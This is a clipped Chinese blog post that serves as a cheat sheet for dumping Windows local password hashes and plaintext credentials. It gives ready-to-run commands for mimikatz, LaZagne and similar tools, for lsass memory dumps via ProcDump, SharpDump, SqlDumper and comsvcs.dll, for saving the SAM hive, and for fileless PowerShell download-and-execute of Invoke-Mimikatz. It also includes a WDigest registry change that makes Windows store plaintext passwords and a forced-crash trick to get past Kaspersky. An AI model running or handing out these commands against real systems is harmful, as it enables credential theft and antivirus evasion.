---
title: Windows 本地 hashdump 备忘录
url: https://blog.thekingofduck.com/post/Dumping-Windows-Local-Credentials-Tools/#toc-heading-15
clipped_at: 2024-04-01 16:53:25
category: default
tags: 
 - blog.thekingofduck.com
---


# Windows 本地 hashdump 备忘录

市面上可见到的读 Windows 本地密码的大多工具都是变则法子的去读 lsass.exe 这个密码的内存或者 SAM 数据库，然后从里面提取 hash。所以有杀软的情况下读密码这事根本就不是工具免不免杀的问题，而是杀软有没有监控保护 lsass.exe 或 SAM 的问题，所以读本地密码条件可以总结为：

> 能正常访访问 lsass.exe 内存或 SAM 数据库。

### 常见工具

工具仅部分，通过以下操作可一键获取密码。

#### mimikatz

https://github.com/gentilkiwi/mimikatz

```plain
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords"  "exit"
```

![](https://kenyons.oss-cn-shenzhen.aliyuncs.com/img/1711961605-e78b639443fbad8ad654a5826225d506.png)

#### QuarksPwDump

https://github.com/quarkslab/quarkspwdump

```css
QuarksPwDump.exe -dhl
```

![](https://kenyons.oss-cn-shenzhen.aliyuncs.com/img/1711961605-8f1dd7ac7c6998cd63938188c1234dc5.png)

#### wce

https://www.ampliasecurity.com/research/wcefaq.html

```css
wce.exe -w
```

![](https://kenyons.oss-cn-shenzhen.aliyuncs.com/img/1711961605-4095cd172ebcbd9d0c8ac871bc24dd85.png)

#### pwdump7

http://www.tarasco.org/security/pwdump\_7/index.html

```css
PwDump7.exe
```

![](https://kenyons.oss-cn-shenzhen.aliyuncs.com/img/1711961605-67aa34dcb54cf0f06b878ebf72cf8157.png)

#### LaZagne

https://github.com/AlessandroZ/LaZagne

```css
laZagne_x86.exe windows
```

![](https://kenyons.oss-cn-shenzhen.aliyuncs.com/img/1711961605-bd4f2be73852e207f2a8fee2d24b98d9.png)

### lsass 内存 dump

工具仅部分，通过以下操作可先获取到 lsass 内存文件，然后使用 mimikatz 可进一步读取密码。  
参考命令:

```css
mimikatz.exe"sekurlsa::minidump lsass.dmp""sekurlsa::logonPasswords full" "exit"
```

#### SharpDump

https://github.com/GhostPack/SharpDump

```perl
for /f  "tokens=2" %i in ('tasklist /FI "IMAGENAME eq lsass.exe" /NH') do SharpDump.exe %i
```

![](https://kenyons.oss-cn-shenzhen.aliyuncs.com/img/1711961605-25fab89c171b55446163c5f67388ba1e.png)

#### ProcDump

https://docs.microsoft.com/en-us/sysinternals/downloads/procdump

```css
Procdump.exe -accepteula -ma lsass.exe lsass.dmp
```

![](https://kenyons.oss-cn-shenzhen.aliyuncs.com/img/1711961605-c7bec31741650cd198a6f3679d0fcb91.png)

#### SqlDumper

https://support.microsoft.com/en-us/help/917825/use-the-sqldumper-exe-utility-to-generate-a-dump-file-in-sql-server

```perl
for /f  "tokens=2" %i in ('tasklist /FI "IMAGENAME eq lsass.exe" /NH') do Sqldumper.exe %i 0 0x01100
```

![](https://kenyons.oss-cn-shenzhen.aliyuncs.com/img/1711961605-5e4d63376f4933d9cc7ada7630b7e979.png)

#### rundll32

https://modexp.wordpress.com/2019/08/30/minidumpwritedump-via-com-services-dll/

```perl
for /f  "tokens=2" %i in ('tasklist /FI "IMAGENAME eq lsass.exe" /NH') do rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump %i .\lsass.dmp full
```

![](https://kenyons.oss-cn-shenzhen.aliyuncs.com/img/1711961605-57709c6bca1d304b6537eb197d9f2463.png)

### 关于 SAM 数据库

管理员执行:

```css
reg save hklm\sam .\sam.hive&reg save hklm\system .\system.hive
```

然后将两个文件导入 SAMInside 并将 NT-Hash 复制出来去相关网站查询即可。（mimikatz 也可以读）

### 关于无文件加载

```plain
powershell "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds"
```

![](https://kenyons.oss-cn-shenzhen.aliyuncs.com/img/1711961605-5ba2053cff23ca2e3e3bb8d351ff6f6e.png)

读一下代码会发现都是 peloader 做的，同理可以把 procdump 做成 psh 实现无文件 dump。

```bash
powershell -nop -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/TheKingOfDuck/hashdump/master/procdump/procdump.ps1');Invoke-Procdump64 -Args '-accepteula -ma lsass.exe lsass.dmp'"
```

![](https://kenyons.oss-cn-shenzhen.aliyuncs.com/img/1711961605-909538fbcdb04add2586a99934adb9eb.png)

### 关于 2012 以及 win10 之后的机器：

```plain
reg add HKLMSYSTEMCurrentControlSetControlSecurityProvidersWDigest /v UseLogonCredential /t REG_DWORD /d 1 /f
```

键值为 1 时 Wdigest Auth 保存明文口令，为 0 则不保存明文。修改为重新登录生效。

### 偏激的 bypass 卡巴读密码

卡巴以及小红伞均对 lsass.exe 进行了保护，导致微软出的两款工具以及他自己的 kldumper 都无法用于 dump lsass。但是可以通过制造蓝屏来获取所有内存的文件 MEMORY.DMP 没然后在提出 lsass 进一步读取。

```coffeescript
taskkill /f /im "wininit.exe"
```

可参考: https://www.mrwu.red/web/2000.html

### 总结

bypass av 可以以卡巴为衡量标准，能过卡巴约等于过全部。

所以文件最终文件放在：

https://github.com/TheKingOfDuck/hashdump
